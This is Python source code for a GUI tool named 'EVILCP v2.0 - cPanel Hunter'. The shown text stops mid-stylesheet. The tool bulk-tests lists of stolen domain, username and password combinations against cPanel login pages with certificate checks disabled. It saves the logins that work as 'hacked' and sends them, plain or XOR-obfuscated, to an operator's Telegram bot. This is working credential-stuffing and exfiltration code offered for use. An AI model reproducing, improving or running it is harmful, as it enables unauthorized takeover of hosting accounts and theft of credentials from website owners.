import sys
import random
import requests
import urllib3
import platform
import subprocess
import os
import json
import base64
from datetime import datetime
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QLineEdit, QCheckBox, QFileDialog, QLabel, QTreeWidget, QTreeWidgetItem,
    QProgressBar, QGroupBox, QGridLayout, QTextEdit, QSplitter, QTabWidget, QFrame
)
from PyQt6.QtGui import QColor, QFontMetrics, QPainter, QPainterPath, QBrush, QPen, QFont, QIcon, QPalette
from PyQt6.QtCore import Qt, QObject, QRunnable, QThreadPool, pyqtSignal, pyqtSlot, QPropertyAnimation, QEasingCurve, QPoint, QRect, pyqtProperty, QTimer, QSettings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

User_device = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0'
}

# Create Res_Lab directory if it doesn't exist
try:
    os.makedirs('EVILCP_RESULTS', exist_ok=True)
except Exception as e:
    print(f"Error creating directory: {e}")

# Configuration file path
CONFIG_FILE = 'evilcp_config.json'

def load_config():
    """Load configuration from file"""
    default_config = {
        'telegram': {
            'bot_token': '',
            'chat_id': '',
            'enabled': False,
            'send_immediately': False,
            'obfuscate_data': True,
            'report_format': 'compact'
        },
        'general': {
            'auto_save': True,
            'max_threads': 10,
            'timeout': 15
        }
    }
    
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                loaded_config = json.load(f)
                # Merge with default config to ensure all keys exist
                for key in default_config:
                    if key in loaded_config:
                        default_config[key].update(loaded_config[key])
        return default_config
    except Exception as e:
        print(f"Error loading config: {e}")
        return default_config

def save_config(config):
    """Save configuration to file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        return True
    except Exception as e:
        print(f"Error saving config: {e}")
        return False

def obfuscate_text(text, key="EVILCP"):
    """Simple obfuscation for Telegram messages"""
    try:
        # XOR obfuscation with key
        result = []
        for i, char in enumerate(text):
            key_char = key[i % len(key)]
            result.append(chr(ord(char) ^ ord(key_char)))
        return base64.b64encode(''.join(result).encode()).decode()
    except:
        return base64.b64encode(text.encode()).decode()

def deobfuscate_text(text, key="EVILCP"):
    """Deobfuscate text"""
    try:
        decoded = base64.b64decode(text.encode()).decode()
        result = []
        for i, char in enumerate(decoded):
            key_char = key[i % len(key)]
            result.append(chr(ord(char) ^ ord(key_char)))
        return ''.join(result)
    except:
        try:
            return base64.b64decode(text.encode()).decode()
        except:
            return text

class TelegramReporter:
    """Telegram reporting class with hidden/bot functionality"""
    
    def __init__(self, bot_token=None, chat_id=None):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
        self.last_report_time = None
        
    def test_connection(self):
        """Test Telegram bot connection"""
        if not self.bot_token or not self.chat_id:
            return False, "Bot token or Chat ID not set"
        
        try:
            url = f"{self.base_url}/getMe"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                bot_info = response.json()
                if bot_info.get('ok'):
                    return True, f"Connected to @{bot_info['result']['username']}"
            return False, "Invalid bot token"
        except Exception as e:
            return False, f"Connection error: {str(e)}"
    
    def send_report(self, report_type, data, obfuscate=True):
        """Send report to Telegram"""
        if not self.bot_token or not self.chat_id:
            return False, "Telegram not configured"
        
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if report_type == "success":
                url, user, password = data
                if obfuscate:
                    url_obs = obfuscate_text(url)
                    user_obs = obfuscate_text(user)
                    pass_obs = obfuscate_text(password)
                    message = f"🔥 *NEW CPANEL HACKED* 🔥\n\n"
                    message += f"🕐 *Time:* `{timestamp}`\n"
                    message += f"🌐 *URL:* `{url_obs}`\n"
                    message += f"👤 *User:* `{user_obs}`\n"
                    message += f"🔑 *Pass:* `{pass_obs}`\n\n"
                    message += f"📡 *Format:* `ENCODED`\n"
                    message += f"🔓 *Key:* `EVILCP`"
                else:
                    message = f"🔥 *NEW CPANEL HACKED* 🔥\n\n"
                    message += f"🕐 *Time:* {timestamp}\n"
                    message += f"🌐 *URL:* `{url}`\n"
                    message += f"👤 *User:* `{user}`\n"
                    message += f"🔑 *Pass:* `{password}`"
                    
            elif report_type == "stats":
                total, success, locked, failed = data
                message = f"📊 *EVILCP STATS UPDATE*\n\n"
                message += f"🕐 *Time:* {timestamp}\n"
                message += f"🎯 *Total Targets:* `{total}`\n"
                message += f"✅ *Hacked:* `{success}`\n"
                message += f"🔒 *2FA Locked:* `{locked}`\n"
                message += f"❌ *Failed:* `{failed}`\n"
                message += f"📈 *Success Rate:* `{success/total*100:.1f}%`"
                
            elif report_type == "start":
                filename, total = data
                message = f"⚡ *EVILCP ATTACK STARTED*\n\n"
                message += f"🕐 *Time:* {timestamp}\n"
                message += f"📁 *Target File:* `{filename}`\n"
                message += f"🎯 *Total Targets:* `{total}`\n"
                message += f"🚀 *Status:* `INITIATED`"
                
            elif report_type == "complete":
                total, success, locked, failed = data
                message = f"🏁 *EVILCP ATTACK COMPLETED*\n\n"
                message += f"🕐 *Time:* {timestamp}\n"
                message += f"🎯 *Total Targets:* `{total}`\n"
                message += f"✅ *Hacked:* `{success}`\n"
                message += f"🔒 *2FA Locked:* `{locked}`\n"
                message += f"❌ *Failed:* `{failed}`\n"
                message += f"📈 *Success Rate:* `{success/total*100:.1f}%`"
                
            else:
                return False, "Unknown report type"
            
            # Send message
            url = f"{self.base_url}/sendMessage"
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'Markdown',
                'disable_web_page_preview': True
            }
            
            response = requests.post(url, json=payload, timeout=10)
            if response.status_code == 200 and response.json().get('ok'):
                self.last_report_time = timestamp
                return True, "Report sent successfully"
            else:
                return False, f"Failed to send: {response.text}"
                
        except Exception as e:
            return False, f"Error sending report: {str(e)}"
    
    def send_bulk_report(self, hacked_list, obfuscate=True):
        """Send bulk report of all hacked cPanels"""
        if not hacked_list:
            return False, "No data to report"
            
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"📦 *BULK CPANEL REPORT*\n\n"
        message += f"🕐 *Time:* {timestamp}\n"
        message += f"📊 *Total Hacked:* `{len(hacked_list)}`\n\n"
        
        for i, (url, user, password) in enumerate(hacked_list[:10]):  # Limit to 10 to avoid message too long
            if obfuscate:
                url_obs = obfuscate_text(url)
                user_obs = obfuscate_text(user)
                pass_obs = obfuscate_text(password)
                message += f"{i+1}. `{url_obs}`\n"
                message += f"   👤 `{user_obs}` | 🔑 `{pass_obs}`\n\n"
            else:
                message += f"{i+1}. `{url}`\n"
                message += f"   👤 `{user}` | 🔑 `{password}`\n\n"
        
        if len(hacked_list) > 10:
            message += f"📋 *+{len(hacked_list)-10} more entries...*\n"
        
        message += f"🔓 *Key:* `EVILCP`"
        
        try:
            url = f"{self.base_url}/sendMessage"
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'Markdown',
                'disable_web_page_preview': True
            }
            
            response = requests.post(url, json=payload, timeout=10)
            if response.status_code == 200 and response.json().get('ok'):
                return True, "Bulk report sent successfully"
            else:
                return False, f"Failed to send bulk report"
        except Exception as e:
            return False, f"Error sending bulk report: {str(e)}"

def open_file_or_folder(path):
    """Open a file or folder in the platform's default file manager"""
    try:
        if platform.system() == "Windows":
            os.startfile(path)
        elif platform.system() == "Darwin":  # macOS
            subprocess.run(["open", path], check=True)
        else:  # Linux and other Unix-like systems
            subprocess.run(["xdg-open", path], check=True)
        return True
    except Exception as e:
        print(f"Error opening path: {e}")
        return False

def masked_random(value, visible_chars=1):
    """Mask characters in a string, showing only a few visible ones"""
    if len(value) <= visible_chars:
        return value  
    
    masked = ["*"] * len(value)  
    indices = random.sample(range(len(value)), visible_chars)  
    for i in indices:
        masked[i] = value[i]  
    return "".join(masked)

def funct_masked_domain(url):
    """Mask domain name while keeping structure"""
    if "://" in url:
        scheme, rest = url.split("://", 1)
    else:
        scheme, rest = "", url 

    if "/" in rest:
        domain, path = rest.split("/", 1)  
    else:
        domain, path = rest, ""

    domain_parts = domain.split(".")
    if len(domain_parts) > 2:  
        subdomains = ".".join(domain_parts[:-2])  
        base_domain = domain_parts[-2]  
        tld = domain_parts[-1]  
        subdomains = masked_random(subdomains, visible_chars=0)
        masked_base = masked_random(base_domain, visible_chars=1)  
        masked_domain = f"{subdomains}.{masked_base}.{tld}"  
    elif len(domain_parts) == 2:  
        base_domain, tld = domain_parts
        masked_base = masked_random(base_domain, visible_chars=1)
        masked_domain = f"{masked_base}.{tld}"
    else:  
        return "*****"  

    masked_url = f"{scheme}://{masked_domain}"
    if path:
        masked_url += f"/{path}"  

    return masked_url

class QToggle(QCheckBox):
    """Custom toggle switch widget with aggressive styling"""
    bg_color = pyqtProperty(
        QColor, lambda self: self._bg_color,
        lambda self, col: setattr(self, '_bg_color', col))
    circle_color = pyqtProperty(
        QColor, lambda self: self._circle_color,
        lambda self, col: setattr(self, '_circle_color', col))
    active_color = pyqtProperty(
        QColor, lambda self: self._active_color,
        lambda self, col: setattr(self, '_active_color', col))
    disabled_color = pyqtProperty(
        QColor, lambda self: self._disabled_color,
        lambda self, col: setattr(self, '_disabled_color', col))
    text_color = pyqtProperty(
        QColor, lambda self: self._text_color,
        lambda self, col: setattr(self, '_text_color', col))

    def __init__(self, parent=None):
        super().__init__(parent)
        self._bg_color, self._circle_color, self._active_color, \
            self._disabled_color, self._text_color = QColor("#FF3333"), \
            QColor("#222222"), QColor('#00FF00'), QColor("#444444"), QColor("#FF0000")
        self._circle_pos, self._intermediate_bg_color = None, None
        self.setFixedHeight(22)
        self._animation_duration = 300  
        self.stateChanged.connect(self.start_transition)
        self._user_checked = False  

    circle_pos = pyqtProperty(
        float, lambda self: self._circle_pos,
        lambda self, pos: (setattr(self, '_circle_pos', pos), self.update()))
    intermediate_bg_color = pyqtProperty(
        QColor, lambda self: self._intermediate_bg_color,
        lambda self, col: setattr(self, '_intermediate_bg_color', col))

    def setDuration(self, duration: int):
        """Set animation duration"""
        self._animation_duration = duration

    def update_pos_color(self, checked=None):
        """Update position and color based on checked state"""
        self._circle_pos = self.height() * (1.1 if checked else 0.1)
        if self.isChecked():
            self._intermediate_bg_color = self._active_color
        else:
            self._intermediate_bg_color = self._bg_color

    def start_transition(self, state):
        """Start toggle animation"""
        if not self._user_checked: 
            self.update_pos_color(state)
            return
        for anim in [self.create_animation, self.create_bg_color_animation]:
            animation = anim(state)
            animation.start()
        self._user_checked = False 

    def mousePressEvent(self, event):
        """Handle mouse press event"""
        self._user_checked = True  
        super().mousePressEvent(event)

    def create_animation(self, state):
        """Create circle position animation"""
        return self._create_common_animation(
            state, b'circle_pos', self.height() * 0.1, self.height() * 1.1)

    def create_bg_color_animation(self, state):
        """Create background color animation"""
        return self._create_common_animation(
            state, b'intermediate_bg_color', self._bg_color, self._active_color)

    def _create_common_animation(self, state, prop, start_val, end_val):
        """Create common animation"""
        animation = QPropertyAnimation(self, prop, self)
        animation.setEasingCurve(QEasingCurve.Type.InOutCubic)
        animation.setDuration(self._animation_duration)
        animation.setStartValue(start_val if state else end_val)
        animation.setEndValue(end_val if state else start_val)
        return animation

    def showEvent(self, event):
        """Handle show event"""
        super().showEvent(event)  
        self.update_pos_color(self.isChecked())

    def resizeEvent(self, event):
        """Handle resize event"""
        self.update_pos_color(self.isChecked())

    def sizeHint(self):
        """Calculate preferred size"""
        size = super().sizeHint()
        text_width = QFontMetrics(
            self.font()).boundingRect(self.text()).width()
        size.setWidth(int(self.height() * 2 + text_width * 1.075))
        return size

    def hitButton(self, pos: QPoint):
        """Check if position hits the button"""
        return self.contentsRect().contains(pos)

    def paintEvent(self, event):
        """Paint the toggle widget"""
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)

        circle_color = QColor(
            self.disabled_color if not self.isEnabled() else self.circle_color)
        bg_color = QColor(
            self.disabled_color if not self.isEnabled() else
            self.intermediate_bg_color)
        text_color = QColor(
            self.disabled_color if not self.isEnabled() else self.text_color)

        bordersradius = self.height() / 2
        togglewidth = self.height() * 2
        togglemargin = self.height() * 0.3
        circlesize = self.height() * 0.8

        # Draw glow effect when active
        if self.isChecked():
            painter.setPen(QPen(QColor(0, 255, 0, 100), 3))
            painter.drawRoundedRect(0, 0, togglewidth, self.height(), bordersradius, bordersradius)

        bg_path = QPainterPath()
        bg_path.addRoundedRect(
            0, 0, togglewidth, self.height(), bordersradius, bordersradius)
        painter.fillPath(bg_path, QBrush(bg_color))

        circle = QPainterPath()
        circle.addEllipse(
            self.circle_pos, self.height() * 0.1, circlesize, circlesize)
        painter.fillPath(circle, QBrush(circle_color))

        # Draw inner dot for more aggressive look
        if self.isChecked():
            inner_circle = QPainterPath()
            inner_circle.addEllipse(
                self.circle_pos + circlesize/4, 
                self.height() * 0.1 + circlesize/4, 
                circlesize/2, circlesize/2)
            painter.fillPath(inner_circle, QBrush(QColor(255, 255, 255)))

        painter.setPen(QPen(QColor(text_color)))
        font = QFont()
        font.setBold(True)
        painter.setFont(font)
        text_rect = QRect(int(togglewidth + togglemargin), 0, self.width() - 
                          int(togglewidth + togglemargin), self.height())
        text_rect.adjust(
            0, (self.height() - painter.fontMetrics().height()) // 2, 0, 0)
        painter.drawText(text_rect, Qt.AlignmentFlag.AlignLeft |
                         Qt.AlignmentFlag.AlignVCenter, self.text())
        painter.end()

class WorkerSignals(QObject):
    """Signals for worker thread"""
    Total_Lists = pyqtSignal(int)
    CP_Success = pyqtSignal(str, str, str)
    CP_2FA = pyqtSignal(int)
    CP_Failed = pyqtSignal(int)
    CP_Success_Count = pyqtSignal(int)
    CP_Remaining = pyqtSignal(int)
    Progress = pyqtSignal(int)
    Report_Sent = pyqtSignal(bool, str)

class CheckLogin_Task(QRunnable):
    """Worker task for checking cPanel logins"""

    def __init__(self, file_target, telegram_reporter=None, report_immediately=False):
        super().__init__()
        self.signals = WorkerSignals()
        self.file_targets = file_target 
        self.telegram_reporter = telegram_reporter
        self.report_immediately = report_immediately
        self.stop_flag = False  
        self.success_count = 0 
        self.cp_2fa_count = 0 
        self.failed_count = 0 
        self.processed = 0 
        self.total_targets = 0
        self.hacked_list = []

    def run(self):
        """Main worker execution"""
        try:
            with open(self.file_targets, 'r', encoding='utf-8', errors='ignore') as file:
                list_targets = file.read().splitlines()
                self.total_targets = len(list_targets)
                self.signals.Total_Lists.emit(self.total_targets)
                
                # Send start report
                if self.telegram_reporter and self.report_immediately:
                    filename = os.path.basename(self.file_targets)
                    success, message = self.telegram_reporter.send_report("start", (filename, self.total_targets))
                    self.signals.Report_Sent.emit(success, message)
                
                for index, cp_format in enumerate(list_targets):
                    if self.stop_flag:
                        break
                    
                    # Calculate progress percentage
                    progress = int((index / self.total_targets) * 100) if self.total_targets > 0 else 0
                    self.signals.Progress.emit(progress)
                    
                    try:
                        parts = cp_format.split('|')
                        if '/login' in parts[0]:
                            parts[0] = parts[0].split('/login')[0]
                    except:
                        parts = [None, None, None]

                    if self.stop_flag:
                        break
                        
                    if len(parts) >= 3:
                        RES_CPANEL = self.CPanel_Login(parts[0], parts[1], parts[2])
                        
                        if not RES_CPANEL:
                            self.failed_count += 1 
                            self.signals.CP_Failed.emit(self.failed_count)
                            with open('EVILCP_RESULTS/CP_TRASH.txt', 'a', encoding='utf-8', errors='ignore') as savetrash:
                                savetrash.write(f'{parts[0]}|{parts[1]}|{parts[2]}\n')  
                        if RES_CPANEL == "2FA":
                            self.cp_2fa_count += 1
                            self.signals.CP_2FA.emit(self.cp_2fa_count)
                            with open('EVILCP_RESULTS/CP_2FA_LOCKED.txt', 'a', encoding='utf-8', errors='ignore') as saveas:
                                saveas.write(f'{parts[0]}|{parts[1]}|{parts[2]}\n')  
                        if RES_CPANEL and RES_CPANEL != "2FA":
                            self.success_count += 1 
                            self.hacked_list.append((parts[0], parts[1], parts[2]))
                            self.signals.CP_Success.emit(parts[0], parts[1], parts[2])
                            self.signals.CP_Success_Count.emit(self.success_count)
                            with open('EVILCP_RESULTS/CP_HACKED.txt', 'a', encoding='utf-8', errors='ignore') as savess:
                                savess.write(f'{parts[0]}|{parts[1]}|{parts[2]}\n')  
                            
                            # Send immediate report for hacked cPanel
                            if self.telegram_reporter and self.report_immediately:
                                success, message = self.telegram_reporter.send_report("success", (parts[0], parts[1], parts[2]))
                                self.signals.Report_Sent.emit(success, message)
                    else: 
                        pass 
                
                # Send completion report
                if self.telegram_reporter and self.report_immediately:
                    success, message = self.telegram_reporter.send_report("complete", 
                                                                         (self.total_targets, self.success_count, 
                                                                          self.cp_2fa_count, self.failed_count))
                    self.signals.Report_Sent.emit(success, message)
                    
        except Exception as e:
            self.Save_log(e)

    def Save_log(self, err):
        """Save error logs"""
        try:
            with open('EVILCP_RESULTS/ERROR_LOGS.txt', 'a') as x_x:
                x_x.write(str(err) + '\n')  
        except Exception as er:
            pass 

    def CPanel_Login(self, Cp_domain, Cp_user, Cp_pass):
        """Attempt cPanel login"""
        self.processed += 1
        self.signals.CP_Remaining.emit(self.processed)

        DATA_LOG = {'user': Cp_user, 'pass': Cp_pass}

        if ':2083' in Cp_domain:
            DOM_PART = str(Cp_domain).split(':2083')
            CP_URL = DOM_PART[0] + ':2083/login'
        elif ':2082' in Cp_domain:
            DOM_PART = str(Cp_domain).split(':2082')
            CP_URL = DOM_PART[0] + ':2082/login'
        else:
            CP_URL = Cp_domain + '/login' if not Cp_domain.endswith('/login') else Cp_domain

        try:
            cp_res = requests.post(
                CP_URL,
                data=DATA_LOG,
                headers=User_device,
                verify=False,
                timeout=15)

            if 'tfa_login_form' in cp_res.text or 'two-factor' in cp_res.text.lower() or '2fa' in cp_res.text.lower():
                return "2FA"

            keyword_success = [
                'lblDomainName',
                'MASTER.securityToken',
                'item_file_manager',
                '"status":1,',
                'Last Login IP Address',
                'Shared IP Address',
                'cPanel Menu',
                'Main Menu',
                'Home'
            ]

            for i in keyword_success:
                if i in cp_res.text:
                    return True 

            return False 

        except Exception as e:
            self.Save_log(f"{Cp_domain} | {e}")
            return False
    
    def stop(self):
        """Stop the worker"""
        self.stop_flag = True

class TelegramConfigDialog(QWidget):
    """Dialog for Telegram configuration"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.parent = parent
        self.setWindowTitle("Telegram Configuration")
        self.setGeometry(300, 300, 500, 400)
        self.initUI()
        
    def initUI(self):
        layout = QVBoxLayout()
        
        # Title
        title = QLabel("🔐 Telegram Bot Configuration")
        title.setStyleSheet("font-size: 18px; font-weight: bold; color: #00FF00; padding: 10px;")
        layout.addWidget(title)
        
        # Instructions
        instructions = QLabel(
            "1. Create a bot via @BotFather on Telegram\n"
            "2. Get your bot token\n"
            "3. Start a chat with your bot\n"
            "4. Get your chat ID (send /start to bot)\n"
            "5. Add bot to your private channel/group"
        )
        instructions.setStyleSheet("color: #CCCCCC; padding: 10px; background-color: #222222; border-radius: 5px;")
        layout.addWidget(instructions)
        
        # Bot Token
        layout.addWidget(QLabel("Bot Token:"))
        self.token_input = QLineEdit()
        self.token_input.setPlaceholderText("e.g., 1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        self.token_input.setEchoMode(QLineEdit.EchoMode.Password)
        layout.addWidget(self.token_input)
        
        # Chat ID
        layout.addWidget(QLabel("Chat ID:"))
        self.chat_id_input = QLineEdit()
        self.chat_id_input.setPlaceholderText("e.g., -1001234567890 or 123456789")
        layout.addWidget(self.chat_id_input)
        
        # Test button
        self.test_btn = QPushButton("Test Connection")
        self.test_btn.clicked.connect(self.test_connection)
        layout.addWidget(self.test_btn)
        
        # Status label
        self.status_label = QLabel("")
        self.status_label.setStyleSheet("color: #FFFF00; padding: 5px;")
        layout.addWidget(self.status_label)
        
        # Options
        options_group = QGroupBox("Reporting Options")
        options_layout = QVBoxLayout()
        
        self.obfuscate_check = QCheckBox("Obfuscate data in reports (recommended)")
        self.obfuscate_check.setChecked(True)
        options_layout.addWidget(self.obfuscate_check)
        
        self.immediate_check = QCheckBox("Send reports immediately (per successful login)")
        self.immediate_check.setChecked(True)
        options_layout.addWidget(self.immediate_check)
        
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)
        
        # Buttons
        btn_layout = QHBoxLayout()
        self.save_btn = QPushButton("Save Configuration")
        self.save_btn.clicked.connect(self.save_config)
        btn_layout.addWidget(self.save_btn)
        
        self.cancel_btn = QPushButton("Cancel")
        self.cancel_btn.clicked.connect(self.close)
        btn_layout.addWidget(self.cancel_btn)
        
        layout.addLayout(btn_layout)
        self.setLayout(layout)
        
    def test_connection(self):
        token = self.token_input.text().strip()
        chat_id = self.chat_id_input.text().strip()
        
        if not token or not chat_id:
            self.status_label.setText("Please enter both Bot Token and Chat ID")
            return
            
        reporter = TelegramReporter(token, chat_id)
        success, message = reporter.test_connection()
        
        if success:
            self.status_label.setText(f"✅ {message}")
            self.status_label.setStyleSheet("color: #00FF00; padding: 5px;")
        else:
            self.status_label.setText(f"❌ {message}")
            self.status_label.setStyleSheet("color: #FF0000; padding: 5px;")
            
    def save_config(self):
        config = load_config()
        config['telegram']['bot_token'] = self.token_input.text().strip()
        config['telegram']['chat_id'] = self.chat_id_input.text().strip()
        config['telegram']['obfuscate_data'] = self.obfuscate_check.isChecked()
        config['telegram']['send_immediately'] = self.immediate_check.isChecked()
        config['telegram']['enabled'] = bool(config['telegram']['bot_token'] and config['telegram']['chat_id'])
        
        if save_config(config):
            self.status_label.setText("✅ Configuration saved successfully!")
            self.status_label.setStyleSheet("color: #00FF00; padding: 5px;")
            if self.parent:
                self.parent.load_telegram_config()
            QTimer.singleShot(2000, self.close)
        else:
            self.status_label.setText("❌ Failed to save configuration")
            self.status_label.setStyleSheet("color: #FF0000; padding: 5px;")

class FileBrowserApp(QMainWindow):
    """Main application window"""
    
    def __init__(self):
        super().__init__()
        self.setWindowTitle("EVILCP v2.0 - cPanel Hunter")
        self.setGeometry(100, 100, 1200, 800)
        self.worker = None
        self.total_label = QLabel("TOTAL TARGETS: 0")
        self.success_label = QLabel("HACKED: 0")
        self.locked_label = QLabel("2FA LOCKED: 0")
        self.failed_label = QLabel("FAILED: 0")
        self.status_label = QLabel("STATUS: IDLE")
        self.telegram_status = QLabel("TELEGRAM: DISABLED")
        self.file_path = False
        self.telegram_reporter = None
        self.config = load_config()

        self.total_count = 0
        self.processed_count = 0
        self.is_running = False
        self.hacked_list = []

        self.threadpool = QThreadPool()
        
        # Timer for status updates
        self.status_timer = QTimer()
        self.status_timer.timeout.connect(self.update_status)
        self.status_counter = 0
        
        self.initUI()
        self.load_telegram_config()

    def load_telegram_config(self):
        """Load Telegram configuration"""
        self.config = load_config()
        if self.config['telegram']['enabled'] and self.config['telegram']['bot_token'] and self.config['telegram']['chat_id']:
            self.telegram_reporter = TelegramReporter(
                self.config['telegram']['bot_token'],
                self.config['telegram']['chat_id']
            )
            self.telegram_status.setText("TELEGRAM: ENABLED")
            self.telegram_status.setStyleSheet("color: #00FF00; font-weight: bold;")
        else:
            self.telegram_reporter = None
            self.telegram_status.setText("TELEGRAM: DISABLED")
            self.telegram_status.setStyleSheet("color: #FF0000; font-weight: bold;")

    def initUI(self):
        """Initialize UI components"""
        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        main_layout = QVBoxLayout()

        # Header
        header_layout = QVBoxLayout()
        title_label = QLabel("⚡ EVILCP v2.0 - cPanel Hunter")
        title_label.setStyleSheet("""
            font-size: 28px;
            font-weight: bold;
            color: #FF0000;
            padding: 10px;
            background-color: #111111;
            border-radius: 5px;
            border: 2px solid #FF0000;
        """)
        header_layout.addWidget(title_label)
        
        subtitle_label = QLabel("by xghost123 | Mass cPanel Login Checker with Telegram Reporting")
        subtitle_label.setStyleSheet("""
            font-size: 16px;
            color: #FF3333;
            padding: 5px;
        """)
        subtitle_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header_layout.addWidget(subtitle_label)
        
        main_layout.addLayout(header_layout)

        # Create tab widget
        self.tab_widget = QTabWidget()
        
        # Main tab
        main_tab = QWidget()
        main_tab_layout = QVBoxLayout()
        
        # File browser section
        file_browser_layout = QVBoxLayout()
        
        format_label = QLabel("📁 Format: Domain:2083|Username|Password (one per line)")
        format_label.setStyleSheet("color: #00FF00; font-size: 14px;")
        file_browser_layout.addWidget(format_label)

        file_row_layout = QHBoxLayout()

        self.browse_button = QPushButton("📂 BROWSE TARGET LIST")
        self.browse_button.clicked.connect(self.browse_file)
        self.browse_button.setFixedHeight(40)
        file_row_layout.addWidget(self.browse_button)

        self.textbox = QLineEdit()
        self.textbox.setPlaceholderText("Select target file...")
        self.textbox.setReadOnly(True)
        self.textbox.setFixedHeight(40)
        file_row_layout.addWidget(self.textbox)

        checkbox2 = QToggle()
        checkbox2.setText('HIDE CREDENTIALS')
        checkbox2.setStyleSheet("""
            QToggle{
                qproperty-bg_color:#FF3333;
                qproperty-circle_color:#111111;
                qproperty-active_color:#00FF00;
                qproperty-disabled_color:#444444;
                qproperty-text_color:#FF0000;
            }
        """)
        checkbox2.setDuration(300)
        checkbox2.setChecked(True)
        checkbox2.setFixedHeight(40)
        file_row_layout.addWidget(checkbox2)
        checkbox2.stateChanged.connect(lambda: self.toggle_changed(checkbox2.isChecked()))

        file_browser_layout.addLayout(file_row_layout)

        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 2px solid #FF0000;
                border-radius: 5px;
                text-align: center;
                height: 25px;
                font-weight: bold;
            }
            QProgressBar::chunk {
                background-color: #FF0000;
                border-radius: 3px;
            }
        """)
        file_browser_layout.addWidget(self.progress_bar)

        # Action buttons
        action_row_layout = QHBoxLayout()

        self.start_button = QPushButton("⚡ START ATTACK")
        self.start_button.clicked.connect(self.start_action)
        self.start_button.setFixedHeight(45)
        action_row_layout.addWidget(self.start_button)

        self.open_folder_button = QPushButton("📁 OPEN RESULTS")
        self.open_folder_button.clicked.connect(self.open_folder)
        self.open_folder_button.setFixedHeight(45)
        action_row_layout.addWidget(self.open_folder_button)

        self.stop_button = QPushButton("🛑 STOP ATTACK")
        self.stop_button.clicked.connect(self.stop_action)
        self.stop_button.setFixedHeight(45)
        self.stop_button.setEnabled(False)
        action_row_layout.addWidget(self.stop_button)

        # Telegram buttons
        self.telegram_config_btn = QPushButton("⚙ TG CONFIG")
        self.telegram_config_btn.clicked.connect(self.open_telegram_config)
        self.telegram_config_btn.setFixedHeight(45)
        action_row_layout.addWidget(self.telegram_config_btn)

        self.send_report_btn = QPushButton("📡 SEND TG REPORT")
        self.send_report_btn.clicked.connect(self.send_telegram_report)
        self.send_report_btn.setFixedHeight(45)
        self.send_report_btn.setEnabled(False)
        action_row_layout.addWidget(self.send_report_btn)

        file_browser_layout.addLayout(action_row_layout)

        # Status labels
        status_layout = QHBoxLayout()
        self.status_label.setStyleSheet("""
            color: #00FFFF;
            font-weight: bold;
            font-size: 14px;
            padding: 5px;
            background-color: #222222;
            border-radius: 3px;
        """)
        status_layout.addWidget(self.status_label)
        
        self.telegram_status.setStyleSheet("""
            color: #FF0000;
            font-weight: bold;
            font-size: 14px;
            padding: 5px;
            background-color: #222222;
            border-radius: 3px;
        """)
        status_layout.addWidget(self.telegram_status)
        
        file_browser_layout.addLayout(status_layout)

        main_tab_layout.addLayout(file_browser_layout)

        # Results tree
        tree_layout = QVBoxLayout()
        tree_header = QLabel("🎯 HACKED CPANELS")
        tree_header.setStyleSheet("""
            font-size: 18px;
            font-weight: bold;
            color: #00FF00;
            padding: 5px;
            background-color: #111111;
            border-radius: 3px;
        """)
        tree_layout.addWidget(tree_header)

        self.tree_widget = QTreeWidget()
        self.tree_widget.setHeaderLabels(["TARGET URL", "USERNAME", "PASSWORD"])
        self.tree_widget.setColumnWidth(0, 350)
        self.tree_widget.setColumnWidth(1, 200)
        self.tree_widget.setColumnWidth(2, 200)
        tree_layout.addWidget(self.tree_widget)

        main_tab_layout.addLayout(tree_layout)

        # Statistics panel
        stats_layout = QHBoxLayout()
        
        stats_box_style = """
            font-weight: bold;
            padding: 10px;
            border-radius: 5px;
            min-width: 150px;
            text-align: center;
        """
        
        self.total_label.setStyleSheet(stats_box_style + "background-color: #333333; color: #00FFFF; border: 1px solid #00FFFF;")
        self.success_label.setStyleSheet(stats_box_style + "background-color: #003300; color: #00FF00; border: 1px solid #00FF00;")
        self.locked_label.setStyleSheet(stats_box_style + "background-color: #333300; color: #FFFF00; border: 1px solid #FFFF00;")
        self.failed_label.setStyleSheet(stats_box_style + "background-color: #330000; color: #FF3333; border: 1px solid #FF3333;")
        
        stats_layout.addWidget(self.total_label)
        stats_layout.addWidget(self.success_label)
        stats_layout.addWidget(self.locked_label)
        stats_layout.addWidget(self.failed_label)

        main_tab_layout.addLayout(stats_layout)
        
        main_tab.setLayout(main_tab_layout)
        
        # Telegram Logs tab
        logs_tab = QWidget()
        logs_layout = QVBoxLayout()
        
        logs_header = QLabel("📡 TELEGRAM REPORTING LOGS")
        logs_header.setStyleSheet("""
            font-size: 18px;
            font-weight: bold;
            color: #00FF00;
            padding: 5px;
            background-color: #111111;
            border-radius: 3px;
        """)
        logs_layout.addWidget(logs_header)
        
        self.logs_text = QTextEdit()
        self.logs_text.setReadOnly(True)
        self.logs_text.setStyleSheet("""
            background-color: #111111;
            color: #00FF00;
            border: 1px solid #FF0000;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        """)
        logs_layout.addWidget(self.logs_text)
        
        logs_tab.setLayout(logs_layout)
        
        # Add tabs
        self.tab_widget.addTab(main_tab, "⚡ MAIN")
        self.tab_widget.addTab(logs_tab, "📡 TELEGRAM LOGS")
        
        self.tab_widget.setStyleSheet("""
            QTabWidget::pane {
